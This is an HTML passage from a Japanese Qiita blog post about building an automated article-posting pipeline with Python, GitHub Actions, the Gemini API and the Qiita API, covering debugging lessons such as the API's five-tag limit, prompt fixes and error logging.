class=\"s\">[OK] 処理が完了しました</span><span class=\"sh\">\"</span><span class=\"p\">)</span>  <span class=\"c1\"># ✓ → [OK]\n</span><span class=\"nf\">print</span><span class=\"p\">(</span><span class=\"sa\">f</span><span class=\"sh\">\"</span><span class=\"s\">[WARN] 警告メッセージ</span><span class=\"sh\">\"</span><span class=\"p\">)</span>    <span class=\"c1\"># ⚠ → [WARN]\n</span><span class=\"nf\">print</span><span class=\"p\">(</span><span class=\"sa\">f</span><span class=\"sh\">\"</span><span class=\"s\">[ERROR] エラーが発生</span><span class=\"sh\">\"</span><span class=\"p\">)</span>     <span class=\"c1\"># ✗ → [ERROR]\n</span></code></pre></div></div>\n<p data-sourcepos=\"67:1-67:160\"><strong>学んだこと</strong>: クロスプラットフォーム対応では、Unicode文字の使用を避けるか、エンコーディングを明示的に設定する</p>\n<h3 data-sourcepos=\"69:1-69:55\">\n<span id=\"3-qiita-apiのタグ数制限による403エラー\" class=\"fragment\"></span><a href=\"#3-qiita-api%E3%81%AE%E3%82%BF%E3%82%B0%E6%95%B0%E5%88%B6%E9%99%90%E3%81%AB%E3%82%88%E3%82%8B403%E3%82%A8%E3%83%A9%E3%83%BC\"><i class=\"fa fa-link\"></i></a>3. Qiita APIのタグ数制限による403エラー</h3>\n<p data-sourcepos=\"71:1-71:11\"><strong>問題</strong>:</p>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"72:1-74:3\"><div class=\"highlight\"><pre><code>HTTPエラー: 403 - {'message': 'Forbidden', 'type': 'forbidden'}\n</code></pre></div></div>\n<p data-sourcepos=\"76:1-76:12\"><strong>原因</strong>:</p>\n<ul data-sourcepos=\"77:1-79:0\">\n<li data-sourcepos=\"77:1-77:124\">動的タグ生成で9個のタグを生成していたが、Qiita APIはタグを最大5個までしか受け付けない</li>\n<li data-sourcepos=\"78:1-79:0\">APIドキュメントを確認せずに実装していた</li>\n</ul>\n<p data-sourcepos=\"80:1-80:14\"><strong>解決策</strong>:</p>\n<div class=\"code-frame\" data-lang=\"python\" data-sourcepos=\"81:1-86:3\"><div class=\"highlight\"><pre><code><span class=\"c1\"># タグを5個に制限\n</span><span class=\"k\">if</span> <span class=\"nf\">len</span><span class=\"p\">(</span><span class=\"n\">tags</span><span class=\"p\">)</span> <span class=\"o\">&gt;</span> <span class=\"mi\">5</span><span class=\"p\">:</span>\n    <span class=\"nf\">print</span><span class=\"p\">(</span><span class=\"sa\">f</span><span class=\"sh\">\"</span><span class=\"s\">[WARN] タグが</span><span class=\"si\">{</span><span class=\"nf\">len</span><span class=\"p\">(</span><span class=\"n\">tags</span><span class=\"p\">)</span><span class=\"si\">}</span><span class=\"s\">個ありますが、Qiita APIの制限により5個に制限します</span><span class=\"sh\">\"</span><span class=\"p\">)</span>\n<span class=\"n\">qiita_tags</span> <span class=\"o\">=</span> <span class=\"p\">[{</span><span class=\"sh\">\"</span><span class=\"s\">name</span><span class=\"sh\">\"</span><span class=\"p\">:</span> <span class=\"n\">tag</span><span class=\"p\">}</span> <span class=\"k\">for</span> <span class=\"n\">tag</span> <span class=\"ow\">in</span> <span class=\"n\">tags</span><span class=\"p\">[:</span><span class=\"mi\">5</span><span class=\"p\">]]</span>\n</code></pre></div></div>\n<p data-sourcepos=\"88:1-88:21\"><strong>学んだこと</strong>:</p>\n<ul data-sourcepos=\"89:1-91:0\">\n<li data-sourcepos=\"89:1-89:47\">APIの仕様を事前に確認する重要性</li>\n<li data-sourcepos=\"90:1-91:0\">エラーメッセージが不十分な場合、リクエスト内容を詳細にログ出力して原因を特定する</li>\n</ul>\n<h3 data-sourcepos=\"92:1-92:40\">\n<span id=\"4-llmプロンプトの設計ミス\" class=\"fragment\"></span><a href=\"#4-llm%E3%83%97%E3%83%AD%E3%83%B3%E3%83%97%E3%83%88%E3%81%AE%E8%A8%AD%E8%A8%88%E3%83%9F%E3%82%B9\"><i class=\"fa fa-link\"></i></a>4. LLMプロンプトの設計ミス</h3>\n<p data-sourcepos=\"94:1-94:12\"><strong>問題</strong>:</p>\n<ul data-sourcepos=\"95:1-97:0\">\n<li data-sourcepos=\"95:1-95:111\">タイトル案を3つ生成していたが、実際のタイトルが「使用例」になってしまった</li>\n<li data-sourcepos=\"96:1-97:0\">パース処理でタイトルが正しく抽出できなかった</li>\n</ul>\n<p data-sourcepos=\"98:1-98:11\"><strong>原因</strong>:</p>\n<ul data-sourcepos=\"99:1-101:0\">\n<li data-sourcepos=\"99:1-99:138\">プロンプトで「タイトル案（3つ）」を指示していたが、実際のタイトルを明確に指定していなかった</li>\n<li data-sourcepos=\"100:1-101:0\">パース処理がタイトル案セクションをスキップできていなかった</li>\n</ul>\n<p data-sourcepos=\"102:1-102:14\"><strong>解決策</strong>:</p>\n<div class=\"code-frame\" data-lang=\"markdown\" data-sourcepos=\"103:1-108:3\"><div class=\"highlight\"><pre><code><span class=\"gh\"># プロンプトの修正</span>\n<span class=\"gs\">**重要**</span>: 記事の最初の行に、実際に使用するタイトルを<span class=\"sb\">`# `</span>で始まるMarkdownの見出し形式で記述してください。\n\nタイトル案は不要です。最初の<span class=\"sb\">`# `</span>行がそのまま記事のタイトルとして使用されます。\n</code></pre></div></div>\n<div class=\"code-frame\" data-lang=\"python\" data-sourcepos=\"110:1-123:3\"><div class=\"highlight\"><pre><code><span class=\"c1\"># パース処理の改善\n</span><span class=\"n\">skip_title_section</span> <span class=\"o\">=</span> <span class=\"bp\">False</span>\n<span class=\"k\">for</span> <span class=\"n\">line</span> <span class=\"ow\">in</span> <span class=\"n\">lines</span><span class=\"p\">:</span>\n    <span class=\"c1\"># タイトル案セクションを検出してスキップ\n</span>    <span class=\"k\">if</span> <span class=\"sh\">\"</span><span class=\"s\">タイトル案</span><span class=\"sh\">\"</span> <span class=\"ow\">in</span> <span class=\"n\">line</span><span class=\"p\">:</span>\n        <span class=\"n\">skip_title_section</span> <span class=\"o\">=</span> <span class=\"bp\">True</span>\n        <span class=\"k\">continue</span>\n    \n    <span class=\"c1\"># 最初の`# `で始まる行をタイトルとして取得\n</span>    <span class=\"k\">if</span> <span class=\"ow\">not</span> <span class=\"n\">found_main_title</span> <span class=\"ow\">and</span> <span class=\"n\">line</span><span class=\"p\">.</span><span class=\"nf\">startswith</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\"># </span><span class=\"sh\">\"</span><span class=\"p\">):</span>\n        <span class=\"n\">title</span> <span class=\"o\">=</span> <span class=\"n\">line</span><span class=\"p\">.</span><span class=\"nf\">replace</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\"># </span><span class=\"sh\">\"</span><span class=\"p\">,</span> <span class=\"sh\">\"\"</span><span class=\"p\">).</span><span class=\"nf\">strip</span><span class=\"p\">()</span>\n        <span class=\"n\">found_main_title</span> <span class=\"o\">=</span> <span class=\"bp\">True</span>\n</code></pre></div></div>\n<p data-sourcepos=\"125:1-125:21\"><strong>学んだこと</strong>:</p>\n<ul data-sourcepos=\"126:1-128:0\">\n<li data-sourcepos=\"126:1-126:65\">LLMへのプロンプトは明確で具体的な指示が必要</li>\n<li data-sourcepos=\"127:1-128:0\">出力形式を厳密に指定することで、パース処理を簡潔にできる</li>\n</ul>\n<h3 data-sourcepos=\"129:1-129:43\">\n<span id=\"5-エラーハンドリングの不足\" class=\"fragment\"></span><a href=\"#5-%E3%82%A8%E3%83%A9%E3%83%BC%E3%83%8F%E3%83%B3%E3%83%89%E3%83%AA%E3%83%B3%E3%82%B0%E3%81%AE%E4%B8%8D%E8%B6%B3\"><i class=\"fa fa-link\"></i></a>5. エラーハンドリングの不足</h3>\n<p data-sourcepos=\"131:1-131:12\"><strong>問題</strong>:</p>\n<ul data-sourcepos=\"132:1-134:0\">\n<li data-sourcepos=\"132:1-132:68\">403エラーが発生した際、原因が特定しづらかった</li>\n<li data-sourcepos=\"133:1-134:0\">デバッグ情報が不足していた</li>\n</ul>\n<p data-sourcepos=\"135:1-135:14\"><strong>解決策</strong>:</p>\n<div class=\"code-frame\" data-lang=\"python\" data-sourcepos=\"136:1-152:3\"><div class=\"highlight\"><pre><code><span class=\"c1\"># デバッグ情報の追加\n</span><span class=\"nf\">print</span><span class=\"p\">(</span><span class=\"sa\">f</span><span class=\"sh\">\"</span><span class=\"s\">[DEBUG] アクセストークン: </span><span class=\"si\">{</span><span class=\"n\">token_preview</span><span class=\"si\">}</span><span class=\"sh\">\"</span><span class=\"p\">)</span>\n<span class=\"nf\">print</span><span class=\"p\">(</span><span class=\"sa\">f</span><span class=\"sh\">\"</span><span class=\"s\">[DEBUG] リクエストURL: </span><span class=\"si\">{</span><span class=\"n\">self</span><span class=\"p\">.</span><span class=\"n\">base_url</span><span class=\"si\">}</span><span class=\"s\">/items</span><span class=\"sh\">\"</span><span class=\"p\">)</span>\n<span class=\"nf\">print</span><span class=\"p\">(</span><span class=\"sa\">f</span><span class=\"sh\">\"</span><span class=\"s\">[DEBUG] ペイロード: title=</span><span class=\"si\">{</span><span class=\"n\">title</span><span class=\"p\">[</span><span class=\"si\">:</span><span class=\"mi\">50</span><span class=\"p\">]</span><span class=\"si\">}</span><span class=\"s\">, tags=</span><span class=\"si\">{</span><span class=\"nf\">len</span><span class=\"p\">(</span><span class=\"n\">tags</span><span class=\"p\">)</span><span class=\"si\">}</span><span class=\"s\">個</span><span class=\"sh\">\"</span><span class=\"p\">)</span>\n<span class=\"nf\">print</span><span class=\"p\">(</span><span class=\"sa\">f</span><span class=\"sh\">\"</span><span class=\"s\">[DEBUG] レスポンスステータス: </span><span class=\"si\">{</span><span class=\"n\">response</span><span class=\"p\">.</span><span class=\"n\">status_code</span><span class=\"si\">}</span><span class=\"sh\">\"</span><span class=\"p\">)</span>\n\n<span class=\"c1\"># エラーメッセージの改善\n</span><span class=\"k\">if</span> <span class=\"n\">e</span><span class=\"p\">.</span><span class=\"n\">response</span><span class=\"p\">.</span><span class=\"n\">status_code</span> <span class=\"o\">==</span> <span class=\"mi\">403</span><span class=\"p\">:</span>\n    <span class=\"n\">error_msg</span> <span class=\"o\">+=</span> <span class=\"sh\">\"</span><span class=\"s\">\n\n考えられる原因:</span><span class=\"sh\">\"</span>\n    <span class=\"n\">error_msg</span> <span class=\"o\">+=</span> <span class=\"sh\">\"</span><span class=\"s\">\n- アクセストークンのスコープが不足しています</span><span class=\"sh\">\"</span>\n    <span class=\"n\">error_msg</span> <span class=\"o\">+=</span> <span class=\"sh\">\"</span><span class=\"s\">\n- タグ数が5個を超えています（Qiita APIの制限）</span><span class=\"sh\">\"</span>\n</code></pre></div></div>\n<p data-sourcepos=\"154:1-154:21\"><strong>学んだこと</strong>:</p>\n<ul data-sourcepos=\"155:1-157:0\">\n<li data-sourcepos=\"155:1-155:98\">エラー発生時には、リクエスト内容とレスポンスを詳細にログ出力する</li>\n<li data-sourcepos=\"156:1-157:0\">よくあるエラーについては、解決策を提示する</li>\n</ul>\n<h2 data-sourcepos=\"158:1-158:27\">\n<span id=\"工夫したポイント\" class=\"fragment\"></span><a href=\"#%E5%B7%A5%E5%A4%AB%E3%81%97%E3%81%9F%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88\"><i class=\"fa fa-link\"></i></a>工夫したポイント</h2>\n<h3 data-sourcepos=\"160:1-160:40\">\n<span id=\"1-プロンプト管理システム\" class=\"fragment\"></span><a href=\"#1-%E3%83%97%E3%83%AD%E3%83%B3%E3%83%97%E3%83%88%E7%AE%A1%E7%90%86%E3%82%B7%E3%82%B9%E3%83%86%E3%83%A0\"><i class=\"fa fa-link\"></i></a>1. プロンプト管理システム</h3>\n<p data-sourcepos=\"162:1-162:83\">プロンプトをMarkdownファイルとして管理し、変数置換に対応：</p>\n<div class=\"code-frame\" data-lang=\"python\" data-sourcepos=\"164:1-176:3\"><div class=\"highlight\"><pre><code><span class=\"c1\"># data/prompts/article_generation_prompt.md\n</span><span class=\"n\">トピック</span><span class=\"p\">:</span> <span class=\"p\">{</span><span class=\"n\">topic</span><span class=\"p\">}</span>\n<span class=\"n\">リサーチ結果</span><span class=\"p\">:</span> <span class=\"p\">{</span><span class=\"n\">research_results</span><span class=\"p\">}</span>\n<span class=\"n\">過去の投稿</span><span class=\"p\">:</span> <span class=\"p\">{</span><span class=\"n\">past_articles_summary</span><span class=\"p\">}</span>\n\n<span class=\"c1\"># 使用例\n</span><span class=\"n\">prompt</span> <span class=\"o\">=</span> <span class=\"n\">template</span><span class=\"p\">.</span><span class=\"nf\">format</span><span class=\"p\">(</span>\n    <span class=\"n\">topic</span><span class=\"o\">=</span><span class=\"n\">selected_topic</span><span class=\"p\">,</span>\n    <span class=\"n\">research_results</span><span class=\"o\">=</span><span class=\"n\">research_results</span><span class=\"p\">,</span>\n    <span class=\"n\">past_articles_summary</span><span class=\"o\">=</span><span class=\"n\">past_articles_summary</span>\n<span class=\"p\">)</span>\n</code></pre></div></div>\n<p data-sourcepos=\"178:1-178:18\"><strong>メリット</strong>:</p>\n<ul data-sourcepos=\"179:1-182:0\">\n<li data-sourcepos=\"179:1-179:35\">プロンプトの変更が容易</li>\n<li data-sourcepos=\"180:1-180:38\">バージョン管理がしやすい</li>\n<li data-sourcepos=\"181:1-182:0\">複数のプロンプトを管理できる</li>\n</ul>\n<h3 data-sourcepos=\"183:1-183:34\">\n<span id=\"2-過去の投稿参照機能\" class=\"fragment\"></span><a href=\"#2-%E9%81%8E%E5%8E%BB%E3%81%AE%E6%8A%95%E7%A8%BF%E5%8F%82%E7%85%A7%E6%A9%9F%E8%83%BD\"><i class=\"fa fa-link\"></i></a>2. 過去の投稿参照機能</h3>\n<p data-sourcepos=\"185:1-185:80\">過去のQiita投稿を取得し、ストーリー性のある記事を生成：</p>\n<div class=\"code-frame\" data-lang=\"python\" data-sourcepos=\"187:1-194:3\"><div class=\"highlight\"><pre><code><span class=\"c1\"># 過去の投稿を取得\n</span><span class=\"n\">fetcher</span> <span class=\"o\">=</span> <span class=\"nc\">QiitaFetcher</span><span class=\"p\">()</span>\n<span class=\"n\">items</span> <span class=\"o\">=</span> <span class=\"n\">fetcher</span><span class=\"p\">.</span><span class=\"nf\">fetch_all_my_items</span><span class=\"p\">(</span><span class=\"n\">days_back</span><span class=\"o\">=</span><span class=\"mi\">180</span><span class=\"p\">)</span>\n\n<span class=\"c1\"># 記事生成時に参照\n</span><span class=\"n\">past_articles_summary</span> <span class=\"o\">=</span> <span class=\"n\">qiita_items_manager</span><span class=\"p\">.</span><span class=\"nf\">get_items_summary</span><span class=\"p\">(</span><span class=\"n\">limit</span><span class=\"o\">=</span><span class=\"mi\">10</span><span class=\"p\">)</span>\n</code></pre></div></div>\n<p data-sourcepos=\"196:1-196:18\"><strong>メリット</strong>:</p>\n<ul data-sourcepos=\"197:1-200:0\">\n<li data-sourcepos=\"197:1-197:56\">連続性のある記事シリーズを構築できる</li>\n<li data-sourcepos=\"198:1-198:62\">読者が「次も読みたい」と思える内容になる</li>\n<li data-sourcepos=\"199:1-200:0\">過去の投稿への参照リンクを自動生成</li>\n</ul>\n<h3 data-sourcepos=\"201:1-201:25\">\n<span id=\"3-動的タグ生成\" class=\"fragment\"></span><a href=\"#3-%E5%8B%95%E7%9A%84%E3%82%BF%E3%82%B0%E7%94%9F%E6%88%90\"><i class=\"fa fa-link\"></i></a>3. 動的タグ生成</h3>\n<p data-sourcepos=\"203:1-203:60\">記事内容に応じてLLMが自動的にタグを生成：</p>\n<div class=\"code-frame\" data-lang=\"python\" data-sourcepos=\"205:1-210:3\"><div class=\"highlight\"><pre><code><span class=\"k\">def</span> <span class=\"nf\">generate_dynamic_tags</span><span class=\"p\">(</span><span class=\"n\">title</span><span class=\"p\">:</span> <span class=\"nb\">str</span><span class=\"p\">,</span> <span class=\"n\">content</span><span class=\"p\">:</span> <span class=\"nb\">str</span><span class=\"p\">)</span> <span class=\"o\">-&gt;</span> <span class=\"n\">List</span><span class=\"p\">[</span><span class=\"nb\">str</span><span class=\"p\">]:</span>\n    <span class=\"c1\"># 記事のタイトルと内容を分析してタグを生成\n</span>    <span class=\"c1\"># 言語・ツール系、目的・行為ベース、プラットフォーム系など\n</span>    <span class=\"c1\"># カテゴリから適切なタグを選ぶ\n</span></code></pre></div></div>\n<p data-sourcepos=\"212:1-212:18\"><strong>メリット</strong>:</p>\n<ul data-sourcepos=\"213:1-216:0\">\n<li data-sourcepos=\"213:1-213:56\">記事内容に最適なタグが自動生成される</li>\n<li data-sourcepos=\"214:1-214:35\">手動でのタグ付けが不要</li>\n<li data-sourcepos=\"215:1-216:0\">タグの漏れを防げる</li>\n</ul>\n<h3 data-sourcepos=\"217:1-217:55\">\n<span id=\"4-モジュール化とエラーハンドリング\" class=\"fragment\"></span><a href=\"#4-%E3%83%A2%E3%82%B8%E3%83%A5%E3%83%BC%E3%83%AB%E5%8C%96%E3%81%A8%E3%82%A8%E3%83%A9%E3%83%BC%E3%83%8F%E3%83%B3%E3%83%89%E3%83%AA%E3%83%B3%E3%82%B0\"><i class=\"fa fa-link\"></i></a>4. モジュール化とエラーハンドリング</h3>\n<p data-sourcepos=\"219:1-219:93\">各機能を独立したモジュールに分割し、エラーハンドリングを強化：</p>\n<div class=\"code-frame\" data-lang=\"python\" data-sourcepos=\"221:1-227:3\"><div class=\"highlight\"><pre><code><span class=\"c1\"># 各モジュールが独立して動作\n</span><span class=\"o\">-</span> <span class=\"n\">research</span><span class=\"o\">/</span><span class=\"n\">collector</span><span class=\"p\">.</span><span class=\"n\">py</span>      <span class=\"c1\"># リサーチ機能\n</span><span class=\"o\">-</span> <span class=\"n\">generator</span><span class=\"o\">/</span><span class=\"n\">article_generator</span><span class=\"p\">.</span><span class=\"n\">py</span>  <span class=\"c1\"># 記事生成\n</span><span class=\"o\">-</span> <span class=\"n\">publisher</span><span class=\"o\">/</span><span class=\"n\">qiita_publisher</span><span class=\"p\">.</span><span class=\"n\">py</span>    <span class=\"c1\"># 投稿機能\n</span><span class=\"o\">-</span> <span class=\"n\">storage</span><span class=\"o\">/</span><span class=\"n\">article_manager</span><span class=\"p\">.</span><span class=\"n\">py</span>      <span class=\"c1\"># 記事管理\n</span></code></pre></div></div>\n<p data-sourcepos=\"229:1-229:18\"><strong>メリット</strong>:</p>\n<ul data-sourcepos=\"230:1-233:0\">\n<li data-sourcepos=\"230:1-230:20\">テストが容易</li>\n<li data-sourcepos=\"231:1-231:35\">機能の追加・変更が容易</li>\n<li data-sourcepos=\"232:1-233:0\">エラーの影響範囲を限定できる</li>\n</ul>\n<h2 data-sourcepos=\"234:1-234:15\">\n<span id=\"参考文献\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE\"><i class=\"fa fa-link\"></i></a>参考文献</h2>\n<ul data-sourcepos=\"236:1-250:0\">\n<li data-sourcepos=\"236:1-238:0\">\n<p data-sourcepos=\"236:3-236:66\"><a href=\"https://qiita.com/api/v2/docs\">Qiita API v2 ドキュメント</a></p>\n<ul data-sourcepos=\"237:3-238:0\">\n<li data-sourcepos=\"237:3-238:0\">タグの制限（最大5個）などの仕様を確認</li>\n</ul>\n</li>\n<li data-sourcepos=\"239:1-241:0\">\n<p data-sourcepos=\"239:3-239:68\"><a href=\"https://ai.google.dev/docs\" rel=\"nofollow noopener\" target=\"_blank\">Google Gemini API ドキュメント</a></p>\n<ul data-sourcepos=\"240:3-241:0\">\n<li data-sourcepos=\"240:3-241:0\">利用可能なモデル一覧とAPIの使い方</li>\n</ul>\n</li>\n<li data-sourcepos=\"242:1-244:0\">\n<p data-sourcepos=\"242:3-242:69\"><a href=\"https://requests.readthedocs.io/\" rel=\"nofollow noopener\" target=\"_blank\">Python requests ライブラリ</a></p>\n<ul data-sourcepos=\"243:3-244:0\">\n<li data-sourcepos=\"243:3-244:0\">HTTPリクエストのエラーハンドリング方法</li>\n</ul>\n</li>\n<li data-sourcepos=\"245:1-247:0\">\n<p data-sourcepos=\"245:3-245:80\"><a href=\"https://github.com/theskumar/python-dotenv\" rel=\"nofollow noopener\" target=\"_blank\">python-dotenv ドキュメント</a></p>\n<ul data-sourcepos=\"246:3-247:0\">\n<li data-sourcepos=\"246:3-247:0\">環境変数の管理方法</li>\n</ul>\n</li>\n<li data-sourcepos=\"248:1-250:0\">\n<p data-sourcepos=\"248:3-248:105\"><a href=\"https://qiita.com/iimuz/items/4837e9c8043ce7c1262b\" id=\"reference-999283c181ac8b919d7c\">Qiita API を利用した記事投稿の実装例</a></p>\n<ul data-sourcepos=\"249:3-250:0\">\n<li data-sourcepos=\"249:3-250:0\">アクセストークンの取得方法と投稿の実装</li>\n</ul>\n</li>\n</ul>\n<h2 data-sourcepos=\"251:1-251:12\">\n<span id=\"まとめ\" class=\"fragment\"></span><a href=\"#%E3%81%BE%E3%81%A8%E3%82%81\"><i class=\"fa fa-link\"></i></a>まとめ</h2>\n<p data-sourcepos=\"253:1-253:63\">今回の開発を通じて、以下の点を学びました：</p>\n<ol data-sourcepos=\"255:1-260:0\">\n<li data-sourcepos=\"255:1-255:114\">\n<strong>APIの仕様を事前に確認する重要性</strong>: タグ数の制限など、APIの制約を理解しておく</li>\n<li data-sourcepos=\"256:1-256:114\">\n<strong>エラーハンドリングの重要性</strong>: デバッグ情報を充実させ、原因特定を容易にする</li>\n<li data-sourcepos=\"257:1-257:87\">\n<strong>プロンプト設計の重要性</strong>: LLMへの指示は明確で具体的にする</li>\n<li data-sourcepos=\"258:1-258:85\">\n<strong>クロスプラットフォーム対応</strong>: Unicode文字の使用に注意する</li>\n<li data-sourcepos=\"259:1-260:0\">\n<strong>モジュール化の重要性</strong>: 機能を分割し、テストとメンテナンスを容易にする</li>\n</ol>\n<p data-sourcepos=\"261:1-261:108\">これらの経験を活かして、より堅牢なシステムを構築していきたいと思います。</p>\n<h2 data-sourcepos=\"265:1-265:50\">\n<span id=\"-導入背景課題なぜ重要か\" class=\"fragment\"></span><a href=\"#-%E5%B0%8E%E5%85%A5%E8%83%8C%E6%99%AF%E8%AA%B2%E9%A1%8C%E3%81%AA%E3%81%9C%E9%87%8D%E8%A6%81%E3%81%8B\"><i class=\"fa fa-link\"></i></a>🧭 導入：背景・課題・なぜ重要か</h2>\n<p data-sourcepos=\"267:1-267:45\">「記事書くの、めんどくさい…」</p>\n<p data-sourcepos=\"269:1-269:295\">エンジニアなら誰しも一度は思ったことがあるのではないでしょうか？特に Qiita のような技術情報共有プラットフォームでは、継続的なアウトプットが重要だと分かっていても、ついつい後回しにしてしまいがちです。</p>\n<p data-sourcepos=\"271:1-271:369\">以前の記事「<a href=\"https://qiita.com/cocokara_bioinfo/items/7440c80d8e6a98177957\">Python × GitHub Actions で始める！Qiita 自動投稿パイプライン構築術</a>」では、Qiita への記事投稿を自動化する基本的なパイプラインを構築しました。しかし、実際に運用してみると、いくつかの課題が見えてきました。</p>\n<ul data-sourcepos=\"273:1-276:0\">\n<li data-sourcepos=\"273:1-273:152\">\n<strong>ローカル環境との差異</strong>: ローカルで動いていたスクリプトが GitHub Actions 上で動かない…あるあるですよね。</li>\n<li data-sourcepos=\"274:1-274:148\">\n<strong>エラーハンドリングの甘さ</strong>: エラーが発生した場合に、どこが原因なのか特定しにくい…デバッグ地獄！</li>\n<li data-sourcepos=\"275:1-276:0\">\n<strong>API レート制限</strong>: Qiita API のレート制限に引っかかって投稿が失敗する…焦る！</li>\n</ul>\n<p data-sourcepos=\"277:1-277:340\">これらの課題を解決し、より安定した自動投稿パイプラインを構築するために、試行錯誤した過程を共有したいと思います。今回の記事では、これらの <strong>“あるある” な課題</strong> に焦点を当て、具体的な解決策と、さらに効率的な運用方法を紹介します。</p>\n<h2 data-sourcepos=\"279:1-279:65\">\n<span id=\"-トピックの概要専門外にも分かる説明\" class=\"fragment\"></span><a href=\"#-%E3%83%88%E3%83%94%E3%83%83%E3%82%AF%E3%81%AE%E6%A6%82%E8%A6%81%E5%B0%82%E9%96%80%E5%A4%96%E3%81%AB%E3%82%82%E5%88%86%E3%81%8B%E3%82%8B%E8%AA%AC%E6%98%8E\"><i class=\"fa fa-link\"></i></a>📘 トピックの概要（専門外にも分かる説明）</h2>\n<p data-sourcepos=\"281:1-281:89\">今回のテーマは、<strong>Qiita 記事の自動投稿パイプライン構築</strong> です。</p>\n<p data-sourcepos=\"283:1-283:164\"><strong>パイプライン</strong> とは、一連の処理を自動的に実行する仕組みのことです。今回の場合は、以下のような流れになります。</p>\n<ol data-sourcepos=\"285:1-288:0\">\n<li data-sourcepos=\"285:1-285:69\">記事の Markdown ファイルを GitHub リポジトリに push</li>\n<li data-sourcepos=\"286:1-286:79\">GitHub Actions が push を検知して自動的にスクリプトを実行</li>\n<li data-sourcepos=\"287:1-288:0\">スクリプトが Qiita API を利用して記事を投稿</li>\n</ol>\n<p data-sourcepos=\"289:1-289:153\">このパイプラインを構築することで、記事を書いたら GitHub に push するだけで Qiita に投稿されるようになります。</p>\n<p data-sourcepos=\"291:1-291:81\">今回の記事では、特に以下の点に焦点を当てて解説します。</p>\n<ul data-sourcepos=\"293:1-296:0\">\n<li data-sourcepos=\"293:1-293:102\">\n<strong>環境構築</strong>: GitHub Actions 上で Python スクリプトを実行するための環境構築</li>\n<li data-sourcepos=\"294:1-294:121\">\n<strong>エラーハンドリング</strong>: エラーが発生した場合に、原因を特定しやすくするための工夫</li>\n<li data-sourcepos=\"295:1-296:0\">\n<strong>レート制限対策</strong>: Qiita API のレート制限に引っかからないようにするための対策</li>\n</ul>\n<h2 data-sourcepos=\"297:1-297:62\">\n<span id=\"-技術的な仕組み実装アーキテクチャ\" class=\"fragment\"></span><a href=\"#-%E6%8A%80%E8%A1%93%E7%9A%84%E3%81%AA%E4%BB%95%E7%B5%84%E3%81%BF%E5%AE%9F%E8%A3%85%E3%82%A2%E3%83%BC%E3%82%AD%E3%83%86%E3%82%AF%E3%83%81%E3%83%A3\"><i class=\"fa fa-link\"></i></a>🔧 技術的な仕組み・実装・アーキテクチャ</h2>\n<p data-sourcepos=\"299:1-299:84\">今回のパイプラインは、主に以下の要素で構成されています。</p>\n<ol data-sourcepos=\"301:1-304:0\">\n<li data-sourcepos=\"301:1-301:93\">\n<strong>Python スクリプト</strong>: Qiita API を利用して記事を投稿するスクリプト</li>\n<li data-sourcepos=\"302:1-302:109\">\n<strong>GitHub Actions</strong>: GitHub の CI/CD サービス。push をトリガーにしてスクリプトを実行</li>\n<li data-sourcepos=\"303:1-304:0\">\n<strong>Qiita API</strong>: Qiita の記事投稿 API</li>\n</ol>\n<p data-sourcepos=\"305:1-305:151\"><strong>Python スクリプト</strong> は、Markdown ファイルを読み込み、Qiita API に必要な情報を整形してリクエストを送信します。</p>\n<p data-sourcepos=\"307:1-307:287\"><strong>GitHub Actions</strong> は、<code>.github/workflows</code> ディレクトリに YAML ファイルを配置することで、様々なイベントをトリガーにして処理を実行できます。今回は、<code>push</code> イベントをトリガーにして、Python スクリプトを実行します。</p>\n<p data-sourcepos=\"309:1-309:207\"><strong>Qiita API</strong> は、記事の投稿、更新、削除などを行うための API です。API を利用するためには、事前に Qiita でアクセストークンを取得する必要があります。</p>\n<h3 data-sourcepos=\"311:1-311:34\">\n<span id=\"メリットデメリット\" class=\"fragment\"></span><a href=\"#%E3%83%A1%E3%83%AA%E3%83%83%E3%83%88%E3%83%87%E3%83%A1%E3%83%AA%E3%83%83%E3%83%88\"><i class=\"fa fa-link\"></i></a>メリット・デメリット</h3>\n<p data-sourcepos=\"313:1-313:17\"><strong>メリット</strong>:</p>\n<ul data-sourcepos=\"315:1-318:0\">\n<li data-sourcepos=\"315:1-315:52\">記事投稿の手間を大幅に削減できる</li>\n<li data-sourcepos=\"316:1-316:52\">継続的なアウトプットを促進できる</li>\n<li data-sourcepos=\"317:1-318:0\">チームでの記事作成を効率化できる</li>\n</ul>\n<p data-sourcepos=\"319:1-319:20\"><strong>デメリット</strong>:</p>\n<ul data-sourcepos=\"321:1-324:0\">\n<li data-sourcepos=\"321:1-321:37\">初期構築に手間がかかる</li>\n<li data-sourcepos=\"322:1-322:56\">API のレート制限に注意する必要がある</li>\n<li data-sourcepos=\"323:1-324:0\">スクリプトのメンテナンスが必要</li>\n</ul>\n<h3 data-sourcepos=\"325:1-325:37\">\n<span id=\"ハマりポイント注意点\" class=\"fragment\"></span><a href=\"#%E3%83%8F%E3%83%9E%E3%82%8A%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88%E6%B3%A8%E6%84%8F%E7%82%B9\"><i class=\"fa fa-link\"></i></a>ハマりポイント・注意点</h3>\n<ul data-sourcepos=\"327:1-330:0\">\n<li data-sourcepos=\"327:1-327:85\">\n<strong>環境変数</strong>: GitHub Actions 上で環境変数を設定する必要がある</li>\n<li data-sourcepos=\"328:1-328:107\">\n<strong>依存関係</strong>: 必要な Python ライブラリを <code>requirements.txt</code> に記述する必要がある</li>\n<li data-sourcepos=\"329:1-330:0\">\n<strong>エラーハンドリング</strong>: エラーが発生した場合に、原因を特定できるようにログを出力するようにする</li>\n</ul>\n<h2 data-sourcepos=\"331:1-331:53\">\n<span id=\"-実践編動くコードコマンド例\" class=\"fragment\"></span><a href=\"#-%E5%AE%9F%E8%B7%B5%E7%B7%A8%E5%8B%95%E3%81%8F%E3%82%B3%E3%83%BC%E3%83%89%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89%E4%BE%8B\"><i class=\"fa fa-link\"></i></a>🧪 実践編：動くコード／コマンド例</h2>\n<h3 data-sourcepos=\"333:1-333:19\">\n<span id=\"1-環境構築\" class=\"fragment\"></span><a href=\"#1-%E7%92%B0%E5%A2%83%E6%A7%8B%E7%AF%89\"><i class=\"fa fa-link\"></i></a>1. 環境構築</h3>\n<p data-sourcepos=\"335:1-335:74\">まず、必要な Python ライブラリをインストールします。</p>\n<div 